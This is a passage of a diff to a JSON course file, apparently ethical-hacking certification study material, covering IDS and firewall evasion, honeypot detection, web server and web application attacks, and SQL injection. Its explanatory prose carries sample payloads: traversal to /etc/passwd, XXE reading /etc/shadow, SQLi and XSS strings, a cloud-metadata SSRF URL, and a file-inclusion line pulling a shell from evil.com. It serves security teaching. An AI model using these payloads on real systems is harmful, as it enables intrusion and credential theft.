-          "content": "<p>Attackers use various techniques to bypass IDS inspection:</p><ul><li><strong>Fragmentation Attacks:</strong> Attackers fragment malicious packets into very small pieces (e.g., using Nmap's <code>-f</code> flag). Many IDS systems struggle to reassemble fragmented packets correctly, while the target host correctly reassembles the original malicious payload.</li><li><strong>TTL-Based Insertion Attacks:</strong> The attacker sends extra packets with low Time-To-Live (TTL) values. These packets reach the IDS (which is positioned closer) but expire before reaching the target host. The IDS sees the extra packets and reassembles a benign payload, causing it to miss the attack.</li><li><strong>Obfuscation and URL Encoding:</strong> Attackers encode payloads to evade signature matching. For example, URL encoding <code>/../../etc/passwd</code> as <code>%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd</code>. Signature-based IDS may fail to decode URL-encoded characters before pattern matching, allowing the attack to bypass detection rules.</li><li><strong>Polymorphic Shellcode:</strong> Advanced attackers use self-modifying code techniques to change the binary pattern of the shellcode on each execution while maintaining the same functionality. This completely defeats signature-based IDS because no two instances share the same byte pattern.</li><li><strong>Advanced Scanning Evasion:</strong> Attackers can combine techniques, such as using <code>nmap -f -T0 -D RND:10 &lt;target&gt;</code>, which combines fragmentation (<code>-f</code>), extremely slow 'paranoid' timing (<code>-T0</code>, 5 minutes between probes) to avoid time-based detection, and generating 10 random decoy IP addresses (<code>-D RND:10</code>) to obscure the real scanning source.</li></ul>",
+          "content": "<p>Attackers use various techniques to bypass IDS inspection by manipulating packet structures and payloads:</p><ul><li><strong>Fragmentation Attacks:</strong> Attackers fragment malicious packets into very small pieces (e.g., using Nmap's <code>-f</code> or <code>-ff</code> flags). Many older IDS systems struggle to reassemble fragmented packets correctly or fast enough, while the target host correctly reassembles the original malicious payload. <strong>Overlapping fragments</strong> can overwrite parts of the payload, creating a benign packet for the IDS but a malicious one for the host.</li><li><strong>TTL-Based Insertion Attacks:</strong> The attacker sends extra \"garbage\" packets with low Time-To-Live (TTL) values. These packets reach the IDS (which is positioned closer) but expire before reaching the target host. The IDS reassembles a mixed, benign payload, while the host only sees the malicious packets.</li><li><strong>Obfuscation and URL Encoding:</strong> Attackers encode payloads to evade signature matching. For example, URL encoding <code>/../../etc/passwd</code> as <code>%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd</code>, or using Unicode encoding, base64, and hex encoding. If the IDS fails to decode all formats, the attack slips through.</li><li><strong>Polymorphic Shellcode:</strong> Advanced attackers use self-modifying code techniques to change the binary pattern of the shellcode on each execution while maintaining the same functionality. This completely defeats signature-based IDS because no two instances share the same byte pattern.</li><li><strong>Advanced Scanning Evasion (Decoys):</strong> Attackers use decoy IP addresses to obscure their real location. Using Nmap, <code>nmap -D RND:10 &lt;target&gt;</code> generates 10 random decoy IP addresses, flooding the IDS logs and hiding the actual source of the scan. Timing delays (like Nmap's <code>-T0</code> paranoid mode) also evade rate-based thresholds.</li><li><strong>Encryption:</strong> Tunneling attacks over encrypted protocols (SSH, SSL/TLS, VPNs) blinds the IDS unless it is configured for SSL interception/decryption.</li></ul>",
           "keyTerms": [
             "Fragmentation Attack",
+            "Overlapping Fragments",
             "TTL Evasion",
-            "URL Encoding",
             "Polymorphic Shellcode",
-            "Decoy Scanning"
+            "Decoy Scanning",
+            "Session Splicing"
           ]
         },
         {
-          "title": "Firewall Bypass Techniques",
-          "content": "<p>Firewalls filter traffic based on IP addresses, ports, and protocols. To bypass these restrictions, attackers often use <strong>tunneling</strong> techniques.</p><p>For example, if a penetration tester needs to bypass a firewall that only allows outbound HTTP and HTTPS traffic, the most effective technique for establishing a reverse shell is to <strong>tunnel the reverse shell over HTTP/HTTPS on port 443</strong>. Since the firewall permits outbound HTTPS traffic, encapsulating the reverse shell communication within HTTPS makes it appear as legitimate encrypted web traffic, effectively bypassing port-based firewall rules.</p>",
+          "title": "Firewall Bypass and Tunneling",
+          "content": "<p>Firewalls restrict traffic based on IP, port, and protocol rules. Attackers bypass these using tunneling and spoofing.</p><ul><li><strong>HTTP/HTTPS Tunneling:</strong> If a firewall only allows outbound web traffic, an attacker can encapsulate alternative protocols (like a reverse shell) inside HTTP or HTTPS packets. Since the firewall sees traffic on port 80 or 443, it permits it, effectively bypassing port restrictions.</li><li><strong>ICMP Tunneling:</strong> Encapsulating data within ICMP Echo Request/Reply packets. If ping is allowed through the firewall, a covert channel can be established.</li><li><strong>SSH Tunneling (Port Forwarding):</strong> Creating an encrypted SSH connection to a remote server and forwarding local or remote ports through it, bypassing deep packet inspection.</li><li><strong>Source Routing:</strong> An attacker specifies the route a packet should take through the network, attempting to route packets around firewall inspection points. Most modern routers drop source-routed packets by default.</li><li><strong>MAC/IP Spoofing:</strong> Faking the source IP or MAC address to appear as a trusted internal machine, bypassing access control lists (ACLs).</li><li><strong>ACK Scanning:</strong> Sending packets with only the ACK flag set. Stateful firewalls might drop them if they don't belong to an established session, but simple packet filters might let them through, helping the attacker map out firewall rules (using Nmap's <code>-sA</code>).</li></ul>",
           "keyTerms": [
             "Firewall Bypass",
             "Tunneling",
             "HTTP/HTTPS Tunneling",
-            "Reverse Shell"
+            "ICMP Tunneling",
+            "SSH Port Forwarding",
+            "ACK Scanning"
           ]
         },
         {
           "title": "Honeypots and Honeynets",
-          "content": "<p><strong>Honeypots</strong> are decoy systems designed to attract attackers.</p><ul><li><strong>High-Interaction vs. Low-Interaction:</strong> <em>High-interaction honeypots</em> use real operating systems and services, providing a full environment for attackers to interact with, enabling the capture of detailed attack methods and zero-day exploits. <em>Low-interaction honeypots</em> only simulate specific services and provide limited information.</li><li><strong>Honeynet Indicators:</strong> A honeynet is a decoy network segment. The most reliable indicator that an attacker has landed in a honeynet is the <strong>absence of legitimate activity</strong>. A network with no real users, no legitimate outbound traffic, and no real production data is a strong indicator of a decoy environment.</li></ul>",
+          "content": "<p><strong>Honeypots</strong> are decoy systems designed to attract attackers, log their behavior, and waste their time. <strong>Honeynets</strong> are entire networks of such systems.</p><ul><li><strong>High-Interaction vs. Low-Interaction:</strong> <em>High-interaction honeypots</em> use real operating systems and services, providing a full environment for attackers. They capture detailed zero-day exploits and rootkits but are harder to maintain and carry higher risk if compromised. <em>Low-interaction honeypots</em> (like Honeyd) only simulate specific services (e.g., faking an FTP banner) and provide limited insight, but are low risk.</li><li><strong>Honeypot Evasion and Detection:</strong> Attackers can identify honeypots by looking for specific signatures. <strong>Absence of legitimate activity</strong> is a strong indicator of a honeynet. Other indicators include detecting virtualization (checking MAC address vendors for VMware/VirtualBox, looking for specific drivers like <code>vboxguest.sys</code>), unnaturally fast or slow system responses, or finding standard honeypot configuration files and ports.</li></ul>",
           "keyTerms": [
             "Honeypot",
             "Honeynet",
             "High-Interaction",
             "Low-Interaction",
+            "VM Detection",
             "Decoy Systems"
           ]
         }
@@ -1020,11 +1068,16 @@
         "Snort",
         "Suricata",
         "Nmap",
-        "Honeyd"
+        "Honeyd",
+        "KFSensor",
+        "Metasploit",
+        "Hping3",
+        "Firewalk"
       ],
       "v13Updates": [
         "AI-powered IDS evasion techniques",
-        "Machine learning-based anomaly detection bypass"
+        "Machine learning-based anomaly detection bypass",
+        "Next-Gen Firewall (NGFW) evasion strategies"
       ]
     },
     {
@@ -1032,9 +1085,9 @@
       "title": "Hacking Web Servers",
       "domainId": 5,
       "icon": "server",
-      "description": "Covers web server architectures, common vulnerabilities, and attack techniques including directory traversal, misconfiguration exploitation, and web server hardening best practices.",
+      "description": "Covers web server architectures, common vulnerabilities, attack techniques including directory traversal, misconfiguration exploitation, and web server hardening best practices.",
       "objectives": [
-        "Understand web server architecture and common platforms",
+        "Understand web server architecture and common platforms (Apache, IIS, Nginx)",
         "Identify web server vulnerabilities and misconfigurations",
         "Perform directory traversal and web server exploitation",
         "Use web server scanning tools for vulnerability assessment",
@@ -1043,44 +1096,50 @@
       "topics": [
         {
           "title": "Web Server Architecture and Misconfigurations",
-          "content": "<p>Web servers (such as Apache, Nginx, IIS) are often deployed with critical security misconfigurations.</p><ul><li><strong>Default Installations:</strong> Leaving default credentials, sample applications, and unnecessary services enabled is one of the most dangerous web server misconfigurations. Attackers frequently check for default admin pages and sample scripts.</li><li><strong>Information Disclosure:</strong> Verbose error messages that reveal stack traces, database connection strings, and internal file paths provide attackers with valuable intelligence. This information aids attackers in understanding the server's architecture and crafting targeted attacks.</li><li><strong>Host Header Injection:</strong> If a web server handles virtual hosting but fails to validate the HTTP <code>Host</code> header, attackers can manipulate it. This facilitates attacks like web cache poisoning or password reset poisoning.</li><li><strong>HTTP Response Splitting:</strong> This attack involves injecting malicious CRLF (Carriage Return Line Feed) characters into HTTP headers to manipulate how the response is processed by the client or intermediary cache, effectively splitting one response into two.</li></ul>",
+          "content": "<p>Web servers are the foundation of web applications and are often deployed with critical security misconfigurations.</p><ul><li><strong>Default Installations:</strong> Leaving default credentials, sample applications, debugging scripts, and unnecessary modules enabled is highly dangerous. Attackers frequently search for default admin pages and known sample scripts.</li><li><strong>Information Disclosure:</strong> Verbose error messages that reveal stack traces, database connection strings, OS versions, and internal file paths provide attackers with valuable intelligence. Disclosing the server version in HTTP headers (e.g., <code>Server: Apache/2.4.49</code>) enables attackers to target specific CVEs.</li><li><strong>Host Header Injection:</strong> If a web server handles virtual hosting but fails to validate the HTTP <code>Host</code> header, attackers can manipulate it. This leads to attacks like web cache poisoning, where malicious responses are cached and served to other users, or password reset poisoning.</li><li><strong>HTTP Response Splitting:</strong> This attack involves injecting malicious CRLF (Carriage Return Line Feed, <code>%0d%0a</code>) characters into HTTP headers. It manipulates how the response is processed by intermediaries (like proxies or caches), effectively splitting one response into two, leading to cache poisoning or XSS.</li></ul>",
           "keyTerms": [
             "Default Credentials",
             "Information Disclosure",
             "Host Header Injection",
             "HTTP Response Splitting",
-            "CRLF Injection"
+            "CRLF Injection",
+            "Banner Grabbing"
           ]
         },
         {
-          "title": "Directory Traversal Attacks",
-          "content": "<p><strong>Directory traversal (path traversal)</strong> exploits insufficient input validation to access files outside the intended web root directory. An attacker uses sequences like <code>../</code> to navigate the file system (e.g., accessing <code>/etc/passwd</code>).</p><ul><li><strong>Filter Evasion (Double Encoding):</strong> If a server filters basic <code>../</code> sequences, attackers might use <code>....//</code>. When the basic filter removes <code>../</code> from <code>....//</code>, it leaves behind <code>../</code>, successfully bypassing the control.</li><li><strong>CVE-2021-41773 (Apache Path Traversal):</strong> A notable vulnerability in Apache 2.4.49 caused by a flaw in the path normalization process that failed to properly handle percent-encoded directory traversal sequences (like <code>%2e</code>). It allowed attackers to bypass access controls and, with mod_cgi enabled, achieve Remote Code Execution.</li></ul>",
+          "title": "Directory Traversal and File Exploitation",
+          "content": "<p><strong>Directory traversal (path traversal)</strong> exploits insufficient input validation to access files outside the intended web root directory. Attackers use sequences like <code>../</code> or <code>..\\</code> to navigate the file system (e.g., accessing <code>/etc/passwd</code> on Linux or <code>C:\\boot.ini</code> on Windows).</p><ul><li><strong>Filter Evasion (Double Encoding):</strong> If a server filters basic <code>../</code> sequences, attackers use obfuscation. <em>Double encoding</em> URL-encodes the dot-dot-slash. <em>Nested traversal</em> uses <code>....//</code>; when the basic filter removes <code>../</code>, it leaves behind <code>../</code>, successfully bypassing the control.</li><li><strong>Null Byte Injection:</strong> Appending a null byte (<code>%00</code>) to a file path can trick older server functions (especially in C/C++ or PHP) into terminating the string early, bypassing extension checks (e.g., <code>file=../../../etc/passwd%00.txt</code>).</li><li><strong>CVE-2021-41773 (Apache Path Traversal):</strong> A notable vulnerability in Apache 2.4.49 caused by a flaw in path normalization that failed to properly handle percent-encoded directory traversal sequences (like <code>%2e%2e</code>). It allowed attackers to bypass access controls and achieve Remote Code Execution (RCE) if CGI scripts were enabled.</li></ul>",
           "keyTerms": [
             "Directory Traversal",
             "Path Traversal",
             "Filter Evasion",
             "Double Encoding",
+            "Null Byte Injection",
             "CVE-2021-41773"
           ]
         },
         {
           "title": "Web Server Attack Methodology & Scanning",
-          "content": "<p>Vulnerability scanning is a crucial step in attacking or defending web servers.</p><ul><li><strong>Nikto:</strong> Nikto is an open-source web server scanner specifically designed to perform comprehensive tests against web servers. It checks for over 6,700 potentially dangerous files, outdated server software, and server configuration issues.</li><li><strong>Risk Prioritization:</strong> When reviewing scanner findings, prioritize data exposure. For example, finding a publicly accessible database backup file (e.g., <code>backup.sql</code>) presents the <strong>highest immediate risk</strong> compared to directory indexing or Apache version disclosure, because the backup file likely contains sensitive user credentials and schema details.</li></ul>",
+          "content": "<p>Vulnerability scanning is a crucial step in attacking or defending web servers.</p><ul><li><strong>Nikto:</strong> An open-source web server scanner designed to perform comprehensive tests against web servers. It checks for over 6,700 potentially dangerous files, outdated server software, default index pages, and configuration issues.</li><li><strong>Directory Brute Forcing:</strong> Tools like <strong>Dirb</strong> and <strong>Gobuster</strong> use wordlists to find hidden directories and files that aren't linked anywhere on the site (e.g., finding an unlinked <code>/admin</code> panel or a <code>/backup.zip</code> file).</li><li><strong>Risk Prioritization:</strong> When reviewing scanner findings, prioritize data exposure. For example, finding a publicly accessible database backup file (e.g., <code>backup.sql</code>) presents the <strong>highest immediate risk</strong> because it likely contains sensitive user credentials, schema details, and application data.</li></ul>",
           "keyTerms": [
             "Nikto",
+            "Dirb",
+            "Gobuster",
             "Vulnerability Scanning",
             "Risk Prioritization",
-            "Database Backup Exposure"
+            "Directory Brute Forcing"
           ]
         },
         {
           "title": "Web Server Hardening",
-          "content": "<p>Hardening a web server involves multiple defensive layers:</p><ul><li>Remove all default installations, sample files, and unnecessary services.</li><li>Configure generic error messages for production environments and log detailed errors internally.</li><li>Implement the <strong>HTTP Strict-Transport-Security (HSTS)</strong> header. HSTS instructs web browsers to only connect to the server using HTTPS, preventing SSL stripping and protocol downgrade attacks.</li><li>Validate and whitelist the <code>Host</code> header to prevent injection attacks.</li></ul>",
+          "content": "<p>Hardening a web server involves multiple defensive layers and the principle of least privilege:</p><ul><li><strong>Configuration:</strong> Remove all default installations, sample files, and disable unnecessary services, modules, and ports. Run the web server service under a dedicated, low-privilege account.</li><li><strong>Error Handling:</strong> Configure generic error messages for production environments and log detailed errors internally to prevent information disclosure.</li><li><strong>Security Headers:</strong> Implement <strong>HTTP Strict-Transport-Security (HSTS)</strong> to instruct browsers to strictly use HTTPS, preventing SSL stripping and protocol downgrade attacks. Implement <code>X-Frame-Options</code> to prevent Clickjacking, and <code>Content-Security-Policy (CSP)</code> to mitigate XSS.</li><li><strong>Access Control:</strong> Validate and whitelist the <code>Host</code> header to prevent injection attacks. Use Web Application Firewalls (WAF) to filter malicious traffic. Ensure strict directory permissions to prevent unauthorized file access.</li></ul>",
           "keyTerms": [
             "Web Server Hardening",
             "HSTS",
+            "CSP",
             "Protocol Downgrade",
-            "Host Header Validation"
+            "Host Header Validation",
+            "Least Privilege"
           ]
         }
       ],
@@ -1088,11 +1147,14 @@
         "Nikto",
         "Dirb",
         "Gobuster",
-        "Burp Suite"
+        "Burp Suite",
+        "Nmap HTTP Enum",
+        "Wfuzz"
       ],
       "v13Updates": [
-        "Cloud-hosted web server security",
-        "Container-based web server vulnerabilities"
+        "Cloud-hosted web server security architectures",
+        "Container-based (Docker/Kubernetes) web server vulnerabilities",
+        "Serverless function risks"
       ]
     },
     {
@@ -1100,55 +1162,59 @@
       "title": "Hacking Web Applications",
       "domainId": 5,
       "icon": "globe",
-      "description": "Deep dive into web application vulnerabilities based on the OWASP Top 10, covering XSS, CSRF, SSRF, broken authentication, and modern web application attack techniques.",
+      "description": "Deep dive into web application vulnerabilities based on the OWASP Top 10, covering XSS, CSRF, SSRF, broken authentication, file uploads, and modern web application attack techniques.",
       "objectives": [
         "Understand the OWASP Top 10 vulnerability categories",
         "Perform Cross-Site Scripting (XSS), CSRF, and SSRF attacks",
-        "Exploit broken authentication and insecure deserialization",
-        "Use web application testing tools and proxies",
+        "Exploit broken authentication, IDOR, and insecure deserialization",
+        "Execute file upload and local/remote file inclusion (LFI/RFI) attacks",
         "Implement secure coding practices and WAF protections"
       ],
       "topics": [
         {
-          "title": "OWASP Top 10 Overview and Access Control",
-          "content": "<p>The OWASP Top 10 (2021) outlines the most critical web application security risks, with <strong>Broken Access Control</strong> ranked as the number one risk (replacing Injection from previous years). Broken Access Control occurs when users can act outside their intended permissions.</p><p>A prime example of Broken Access Control is <strong>Insecure Direct Object References (IDOR)</strong>. IDOR occurs when an application provides direct access to objects based on user-supplied input without proper authorization checks. For instance, if an attacker changes an API URL from <code>/api/user/1234/profile</code> to <code>/api/user/1235/profile</code> and successfully views another user's data, they have exploited an IDOR vulnerability.</p>",
+          "title": "OWASP Top 10 and Access Control",
+          "content": "<p>The OWASP Top 10 outlines the most critical web application security risks, with <strong>Broken Access Control</strong> ranked as the number one risk. Broken Access Control occurs when users can act outside their intended permissions, leading to unauthorized information disclosure, modification, or destruction.</p><p>A primary example is <strong>Insecure Direct Object References (IDOR)</strong>. IDOR occurs when an application provides direct access to objects based on user-supplied input without proper authorization checks. For instance, if an attacker changes an API URL from <code>/api/user/1234/profile</code> to <code>/api/user/1235/profile</code> and successfully views another user's data, they have exploited IDOR. Another access control failure is <strong>Privilege Escalation</strong>, where a standard user manipulates parameters to gain administrator rights.</p>",
           "keyTerms": [
             "OWASP Top 10",
             "Broken Access Control",
             "IDOR",
-            "Insecure Direct Object References"
+            "Insecure Direct Object References",
+            "Privilege Escalation"
           ]
         },
         {
-          "title": "Cross-Site Scripting (XSS) and XXE Injection",
-          "content": "<p><strong>Cross-Site Scripting (XSS)</strong> allows attackers to execute malicious scripts in the victim's browser.</p><ul><li><strong>Stored vs. Reflected XSS:</strong> <em>Stored (persistent) XSS</em> occurs when the malicious script is saved on the server (e.g., in a database or forum post) and executes every time a user views the affected page. <em>Reflected (non-persistent) XSS</em> requires the victim to click a specially crafted URL containing the malicious script, which is then reflected back by the server.</li></ul><p><strong>XML External Entity (XXE) Injection:</strong> XXE targets XML parsers. An attacker submits an XML payload with a malicious <code>&lt;!DOCTYPE&gt;</code> declaration defining an external entity (e.g., <code>&lt;!ENTITY xxe SYSTEM \"file:///etc/shadow\"&gt;</code>). When the parser processes the entity (<code>&amp;xxe;</code>), it replaces it with the contents of the target file, leading to sensitive file disclosure. Mitigation involves disabling external entity processing in XML parsers.</p>",
+          "title": "Cross-Site Scripting (XSS)",
+          "content": "<p><strong>Cross-Site Scripting (XSS)</strong> occurs when an application includes untrusted data in a web page without proper validation or escaping, allowing attackers to execute malicious scripts in the victim's browser.</p><ul><li><strong>Stored (Persistent) XSS:</strong> The malicious script is saved permanently on the target server (e.g., in a database, forum post, or comment field). It executes every time any user views the affected page. This is the most dangerous form.</li><li><strong>Reflected (Non-Persistent) XSS:</strong> The injected script is reflected off the web server, such as in an error message or search result. It requires social engineering, forcing the victim to click a specially crafted URL containing the payload (e.g., <code>http://site.com/search?q=&lt;script&gt;alert(1)&lt;/script&gt;</code>).</li><li><strong>DOM-based XSS:</strong> The vulnerability exists purely in the client-side code rather than the server-side code. The malicious payload is executed as a result of modifying the DOM environment in the victim's browser, often involving sources like <code>window.location</code> and sinks like <code>innerHTML</code>.</li></ul><p>Defenses include contextual output encoding, strict input validation, and implementing a strong Content Security Policy (CSP).</p>",
           "keyTerms": [
             "Stored XSS",
             "Reflected XSS",
-            "XXE Injection",
-            "XML External Entity"
+            "DOM-based XSS",
+            "Output Encoding",
+            "CSP"
           ]
         },
         {
-          "title": "CSRF, SSRF, and Insecure File Uploads",
-          "content": "<p><strong>Cross-Site Request Forgery (CSRF):</strong> An attack where the client is tricked into making unintended, authenticated requests. For example, an attacker hosts a hidden HTML form pointing to a banking transfer URL and uses JavaScript (<code>&lt;script&gt;document.forms[0].submit();&lt;/script&gt;</code>) to auto-submit it. To defend against CSRF, applications use random tokens. However, for anti-CSRF tokens to be effective, the server <strong>must validate that the token matches a value stored on the server for that specific session</strong> before processing the request.</p><p><strong>Server-Side Request Forgery (SSRF):</strong> An attack where the attacker makes the server send requests to unintended internal or external resources. A common SSRF target in cloud environments is the <strong>cloud instance metadata endpoint</strong> (e.g., <code>http://169.254.169.254/latest/meta-data/</code>). If successful, attackers can retrieve sensitive IAM credentials, API keys, and infrastructure configurations.</p><p><strong>Insecure File Uploads:</strong> If a server only validates file extensions (like <code>.jpg</code> or <code>.png</code>) to secure uploads, an attacker can bypass this by uploading a PHP web shell with a <strong>double extension</strong> (e.g., <code>shell.php.jpg</code>) or by modifying the <code>Content-Type</code> header.</p>",
+          "title": "CSRF, SSRF, and XXE",
+          "content": "<p><strong>Cross-Site Request Forgery (CSRF):</strong> Tricks the victim's browser into making unintended, authenticated requests to a vulnerable application. For example, an attacker hosts a hidden HTML form pointing to a banking transfer URL and uses JavaScript to auto-submit it. The browser automatically includes the victim's session cookies. Defense requires <strong>Anti-CSRF tokens</strong>; however, the server <em>must actively validate that the token matches a value stored on the server for that specific session</em>.</p><p><strong>Server-Side Request Forgery (SSRF):</strong> The attacker coerces the vulnerable server into making requests to unintended internal or external resources. A common, highly critical SSRF target in cloud environments (AWS, Azure, GCP) is the <strong>cloud instance metadata endpoint</strong> (e.g., <code>http://169.254.169.254/latest/meta-data/</code>). By fetching this URL, attackers can retrieve sensitive IAM credentials, API keys, and infrastructure details.</p><p><strong>XML External Entity (XXE) Injection:</strong> Targets poorly configured XML parsers. An attacker submits an XML payload with a malicious <code>&lt;!DOCTYPE&gt;</code> declaration defining an external entity (e.g., <code>&lt;!ENTITY xxe SYSTEM \"file:///etc/shadow\"&gt;</code>). When parsed, the entity (<code>&amp;xxe;</code>) is replaced with the local file's contents, leading to data disclosure. Defense involves disabling external entity parsing and DTD processing.</p>",
           "keyTerms": [
             "CSRF",
             "Anti-CSRF Token",
             "SSRF",
             "Cloud Instance Metadata",
-            "Insecure File Uploads",
-            "Double Extension"
+            "XXE Injection",
+            "XML External Entity"
           ]
         },
         {
-          "title": "Authentication and Session Vulnerabilities",
-          "content": "<p>Authentication mechanisms are frequently targeted. In modern web applications using JSON Web Tokens (JWT) for authentication, a critical vulnerability is <strong>JWT Algorithm Confusion</strong>. An attacker can modify the JWT header to specify <code>{\"alg\":\"none\"}</code> and remove the digital signature. If the server is misconfigured and accepts the 'none' algorithm, it fails to validate the signature, allowing the attacker to forge arbitrary tokens with elevated claims (like admin privileges).</p>",
+          "title": "Authentication, File Uploads, and LFI/RFI",
+          "content": "<p><strong>Authentication Vulnerabilities:</strong> Modern apps often use JSON Web Tokens (JWT). A critical vulnerability is <strong>JWT Algorithm Confusion</strong>. An attacker modifies the JWT header to specify <code>{\"alg\":\"none\"}</code> and removes the digital signature. If the server accepts the 'none' algorithm, it allows forging arbitrary tokens with admin claims. Other issues include credential stuffing and lack of rate limiting.</p><p><strong>Insecure File Uploads:</strong> If a server only validates file extensions (e.g., <code>.jpg</code>) via client-side checks or simple string matching, an attacker can bypass this. Techniques include using a <strong>double extension</strong> (e.g., <code>shell.php.jpg</code>), changing the MIME type in the <code>Content-Type</code> header via Burp Suite, or using null bytes (<code>shell.php%00.jpg</code>). Once uploaded, the web shell grants Remote Code Execution.</p><p><strong>File Inclusion (LFI/RFI):</strong> <em>Local File Inclusion (LFI)</em> allows an attacker to include files existing on the server (e.g., <code>?page=../../etc/passwd</code>). <em>Remote File Inclusion (RFI)</em> allows including malicious scripts from external servers (e.g., <code>?page=http://evil.com/shell.txt</code>). LFI in PHP applications often uses wrappers like <code>php://filter/convert.base64-encode/resource=index.php</code> to read source code without executing it.</p>",
           "keyTerms": [
-            "JWT",
-            "JSON Web Token",
             "JWT Algorithm Confusion",
-            "Authentication Bypass"
+            "Insecure File Uploads",
+            "Double Extension",
+            "LFI (Local File Inclusion)",
+            "RFI (Remote File Inclusion)",
+            "PHP Wrappers"
           ]
         }
       ],
@@ -1156,11 +1222,14 @@
         "Burp Suite",
         "OWASP ZAP",
         "w3af",
-        "SQLMap"
+        "BeEF",
+        "SQLMap",
+        "Postman"
       ],
       "v13Updates": [
         "API security testing (GraphQL, REST)",
-        "Modern authentication bypass techniques"
+        "Modern authentication bypass (OAuth, SAML, JWT)",
+        "Single Page Application (SPA) vulnerabilities"
       ]
     },
     {
@@ -1168,79 +1237,88 @@
       "title": "SQL Injection",
       "domainId": 5,
       "icon": "database",
-      "description": "In-depth coverage of SQL injection attack types (in-band, blind, out-of-band), exploitation techniques with sqlmap, and comprehensive prevention through parameterized queries and input validation.",
+      "description": "In-depth coverage of SQL injection attack types (in-band, blind, out-of-band), exploitation techniques with SQLMap, and comprehensive prevention through parameterized queries, stored procedures, and input validation.",
       "objectives": [
-        "Understand SQL injection concepts and attack types",
-        "Perform in-band, blind, and out-of-band SQL injection",
-        "Use SQLMap for automated SQL injection testing",
+        "Understand SQL injection concepts, mechanics, and attack types",
+        "Perform in-band (Error/UNION), blind (Boolean/Time), and out-of-band SQL injection",
+        "Use SQLMap for automated SQL injection discovery and exploitation",
         "Extract data, escalate privileges, and execute OS commands via SQLi",
-        "Implement SQL injection countermeasures"
+        "Implement robust SQL injection countermeasures"
       ],
       "topics": [
         {
           "title": "SQL Injection Fundamentals",
-          "content": "<p><strong>SQL Injection (SQLi)</strong> occurs when untrusted user input is concatenated directly into database queries without proper parameterization. This allows attackers to manipulate the query logic.</p><p>A classic example is <strong>Authentication Bypass</strong>. If an attacker enters <code>' OR '1'='1' --</code> into a username field, the single quote closes the string, <code>OR '1'='1'</code> injects a condition that always evaluates to true, and <code>--</code> comments out the remainder of the query (such as password verification). This causes the database to return all users, typically logging the attacker in as the first user in the database (often the administrator).</p>",
+          "content": "<p><strong>SQL Injection (SQLi)</strong> occurs when untrusted user input is concatenated directly into database queries without proper parameterization or escaping. This allows attackers to alter the query logic to view, modify, or delete database information.</p><p>A classic example is <strong>Authentication Bypass</strong>. If an attacker enters <code>' OR '1'='1' --</code> into a username field, the query becomes <code>SELECT * FROM users WHERE username = '' OR '1'='1' -- AND password = '...'</code>. The single quote breaks out of the string, <code>OR '1'='1'</code> creates a universally true condition, and <code>--</code> comments out the password check. The database returns the first user (often the administrator), granting unauthorized access.</p>",
           "keyTerms": [
             "SQL Injection",
             "Authentication Bypass",
             "Query Manipulation",
-            "OR 1=1"
+            "OR 1=1",
+            "Tautology"
           ]
         },
         {
           "title": "In-Band SQL Injection",
-          "content": "<p><strong>In-band SQL injection</strong> (or classic SQLi) occurs when the attacker uses the same communication channel to launch the attack and directly retrieve the results in the application's HTTP response.</p><ul><li><strong>Error-based SQLi:</strong> Extracts data by intentionally causing database errors that leak schema or data details in the error message.</li><li><strong>UNION-based SQLi:</strong> Uses the <code>UNION SELECT</code> operator to combine results from the injected query with the original query's results. Before a UNION-based attack can work, the attacker <strong>must first determine the exact number of columns</strong> in the original <code>SELECT</code> query (often achieved using <code>ORDER BY</code> clauses or incrementing NULL values).</li></ul>",
+          "content": "<p><strong>In-band SQL injection</strong> (or classic SQLi) occurs when the attacker uses the same communication channel to launch the attack and directly retrieve the results in the application's HTTP response.</p><ul><li><strong>Error-Based SQLi:</strong> Extracts data by intentionally injecting syntax errors or mathematical impossibilities (like divide by zero or converting text to integers) to trigger database errors. If verbose error logging is on, the error message leaks table names, column names, or actual data.</li><li><strong>UNION-Based SQLi:</strong> Uses the <code>UNION SELECT</code> operator to combine results from the injected malicious query with the original legitimate query. Before a UNION-based attack can work, the attacker <strong>must first determine the exact number of columns</strong> returned by the original query. This is often achieved by incrementing an <code>ORDER BY</code> clause (e.g., <code>ORDER BY 1, ORDER BY 2...</code> until an error occurs) or injecting multiple NULL values (<code>UNION SELECT NULL, NULL...</code>). Furthermore, the data types of the injected columns must match the original query.</li></ul>",
           "keyTerms": [
             "In-Band SQLi",
             "Error-Based SQLi",
             "UNION-Based SQLi",
             "UNION SELECT",
-            "ORDER BY"
+            "ORDER BY Enumeration",
+            "Column Matching"
           ]
         },
         {
           "title": "Blind SQL Injection",
-          "content": "<p><strong>Blind SQL Injection</strong> is used when the application does not display query results or error messages directly in the response.</p><ul><li><strong>Boolean-Based Blind SQLi:</strong> The attacker infers information by asking the database true/false questions and observing if the application returns a different or empty page. For example, comparing the response of <code>/products?id=1 AND 1=1</code> (true condition returning a normal page) against <code>/products?id=1 AND 1=2</code> (false condition returning a different page).</li><li><strong>Time-Based Blind SQLi:</strong> The attacker infers true/false conditions by injecting time delay functions and measuring the server's response time. For example, using Microsoft SQL Server's <code>WAITFOR DELAY '0:0:5'</code> or MySQL's <code>SLEEP()</code>. If a condition is true, the server waits 5 seconds before responding.</li></ul>",
+          "content": "<p><strong>Blind SQL Injection</strong> is used when the application is vulnerable to injection but does not display query results or error messages directly in the HTTP response. Data must be extracted slowly, bit by bit.</p><ul><li><strong>Boolean-Based (Inferential) Blind SQLi:</strong> The attacker infers information by asking the database true/false questions and observing if the application returns a different or empty page. For example, comparing the response of <code>/products?id=1 AND 1=1</code> (true condition, normal page returned) against <code>/products?id=1 AND 1=2</code> (false condition, missing content or different page returned). Attackers use functions like <code>SUBSTRING()</code> to guess letters one by one.</li><li><strong>Time-Based Blind SQLi:</strong> Used when the application response is identical regardless of the query outcome. The attacker infers true/false conditions by injecting time delay functions. For example, using Microsoft SQL Server's <code>WAITFOR DELAY '0:0:5'</code>, PostgreSQL's <code>pg_sleep(5)</code>, or MySQL's <code>SLEEP(5)</code>. If the injected condition is true, the server delays responding for 5 seconds, confirming the guess.</li></ul>",
           "keyTerms": [
             "Blind SQLi",
             "Boolean-Based Blind SQLi",
             "Time-Based Blind SQLi",
             "WAITFOR DELAY",
-            "SLEEP"
+            "SLEEP",
+            "Inferential SQLi"
           ]
         },
         {
-          "title": "Advanced SQL Injection & Evasion",
